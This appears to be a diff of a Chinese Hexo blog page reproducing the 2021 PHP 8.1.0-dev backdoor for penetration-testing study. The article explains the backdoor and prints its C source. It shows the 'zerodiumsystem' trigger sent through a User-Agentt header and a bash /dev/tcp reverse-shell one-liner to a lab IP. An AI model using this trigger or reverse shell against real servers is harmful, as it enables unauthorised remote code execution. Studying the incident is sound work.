@@ -4,16 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hexo">
-    <meta name="description" content="
-
-
-
-PHP 8.1.0-dev 开发版本后门事件
-
-漏洞介绍:
+    <meta name="keywords" content="PHP 8.1.0-dev 开发版本后门事件, Hexo">
+    <meta name="description" content="漏洞介绍:
 PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码
-">
+https://news-web.php.net/php">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -25,7 +19,7 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hexo</title>
+    <title>PHP 8.1.0-dev 开发版本后门事件 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -342,12 +336,12 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">PHP 8.1.0-dev 开发版本后门事件</h1>
                 </div>
             </div>
         </div>
@@ -375,6 +369,23 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
+                            </a>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Php/" class="post-category">
+                                Php
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -404,46 +415,29 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <!doctype html>
-<html>
-<head>
-<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
-<title>PHP 8.1.0-dev 开发版本后门事件</title>
-</head>
-<body><p><strong>漏洞介绍:</strong></p>
+                <p><strong>漏洞介绍:</strong></p>
 <p>PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送<strong>User-Agentt</strong>头来执行任意代码</p>
-<p><a href='https://news-web.php.net/php.internals/113838' target='_blank' class='url'>https://news-web.php.net/php.internals/113838</a></p>
+<p><a target="_blank" rel="noopener" href="https://news-web.php.net/php.internals/113838">https://news-web.php.net/php.internals/113838</a></p>
 <p><strong>漏洞复现</strong></p>
-<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\8.1.png" referrerpolicy="no-referrer" alt="8.1"></p>
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\8.1.png" alt="8.1"></p>
 <p>能够以</p>
-<pre><code>zerdiumsystem
-</code></pre>
-<p>的形式执行任意代码，也可以通过该后门进行反向shell的链接</p>
-<pre><code>/bin/bash -c &#39;exec bash -i &gt;&amp; /dev/tcp/192.168.121.135/4444 0&gt;&amp;1&#39;
-</code></pre>
-<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\8.1shell.png" referrerpolicy="no-referrer" alt="8.1shell"></p>
-<p><strong>后门代码</strong></p>
-<pre><code class='language-c' lang='c'>if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL(&quot;_SERVER&quot;))) &amp;&amp;
-		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), &quot;HTTP_USER_AGENTT&quot;, sizeof(&quot;HTTP_USER_AGENTT&quot;) - 1))) &#123;
-		convert_to_string(enc);
-		if (strstr(Z_STRVAL_P(enc), &quot;zerodium&quot;)) &#123;
-			zend_try &#123;
-				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, &quot;REMOVETHIS: sold to zerodium, mid 2017&quot;);
-			&#125; zend_end_try();
-		&#125;
-	&#125;
-</code></pre>
-<p>这段代码的作用是检查 HTTP 请求头中的 &quot;User-Agentt&quot; 字段是否包含字符串 &quot;zerodium&quot;，如果包含，则执行一个 PHP 代码段,具体流程如下</p>
-<ol start='' >
-<li>检查全局变量 PG(http_globals)[TRACK_VARS_SERVER] 是否为数组类型或者是否已经被自动注册为全局变量 &quot;_SERVER&quot;，如果是则继续执行。</li>
-<li>使用 zend_hash_str_find 函数在 PG(http_globals)[TRACK_VARS_SERVER] 中查找 &quot;HTTP_USER_AGENTT&quot; 字段，并将其值存储到 enc 变量中。</li>
-<li>将 enc 变量转换为字符串类型，并使用 strstr 函数检查字符串中是否包含 &quot;zerodium&quot; 子字符串。如果包含，则继续执行。</li>
-<li>使用 zend_eval_string 函数执行一个 PHP 代码段，该代码段是从 User-Agentt字段的第八个字符开始的字符串，它会输出一条提示信息 &quot;REMOVETHIS: sold to zerodium, mid 2017&quot;。</li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zerdiumsystem</span><br></pre></td></tr></table></figure>
 
+<p>的形式执行任意代码，也可以通过该后门进行反向shell的链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.121.135/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\8.1shell.png" alt="8.1shell"></p>
+<p><strong>后门代码</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL(<span class="string">&quot;_SERVER&quot;</span>))) &amp;&amp;</span><br><span class="line">		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), <span class="string">&quot;HTTP_USER_AGENTT&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;HTTP_USER_AGENTT&quot;</span>) - <span class="number">1</span>))) &#123;</span><br><span class="line">		convert_to_string(enc);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strstr</span>(Z_STRVAL_P(enc), <span class="string">&quot;zerodium&quot;</span>)) &#123;</span><br><span class="line">			zend_try &#123;</span><br><span class="line">				zend_eval_string(Z_STRVAL_P(enc)+<span class="number">8</span>, <span class="literal">NULL</span>, <span class="string">&quot;REMOVETHIS: sold to zerodium, mid 2017&quot;</span>);</span><br><span class="line">			&#125; zend_end_try();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的作用是检查 HTTP 请求头中的 “User-Agentt” 字段是否包含字符串 “zerodium”，如果包含，则执行一个 PHP 代码段,具体流程如下</p>
+<ol>
+<li>检查全局变量 PG(http_globals)[TRACK_VARS_SERVER] 是否为数组类型或者是否已经被自动注册为全局变量 “_SERVER”，如果是则继续执行。</li>
+<li>使用 zend_hash_str_find 函数在 PG(http_globals)[TRACK_VARS_SERVER] 中查找 “HTTP_USER_AGENTT” 字段，并将其值存储到 enc 变量中。</li>
+<li>将 enc 变量转换为字符串类型，并使用 strstr 函数检查字符串中是否包含 “zerodium” 子字符串。如果包含，则继续执行。</li>
+<li>使用 zend_eval_string 函数执行一个 PHP 代码段，该代码段是从 User-Agentt字段的第八个字符开始的字符串，它会输出一条提示信息 “REMOVETHIS: sold to zerodium, mid 2017”。</li>
 </ol>
-<p>&nbsp;</p>
-</body>
-</html>
+
                 
             </div>
             <hr/>
@@ -587,13 +581,13 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-8.1.0-dev-kai-fa-ban-ben-hou-men-shi-jian/">
+                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/cve-2019-11043/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="CVE-2019-11043">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">CVE-2019-11043</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -608,8 +602,20 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            uu2fu3o
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Php/" class="post-category">
+                                    Php
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -624,13 +630,13 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/cve-2019-11043/">
+                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-fpm-fastcgi-wei-shou-quan-fang-wen-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="PHP-FPM Fastcgi 未授权访问漏洞">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">PHP-FPM Fastcgi 未授权访问漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -645,8 +651,20 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            uu2fu3o
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Php/" class="post-category">
+                                    Php
+                                </a>
+                            
                             
                         </span>
                     </div>
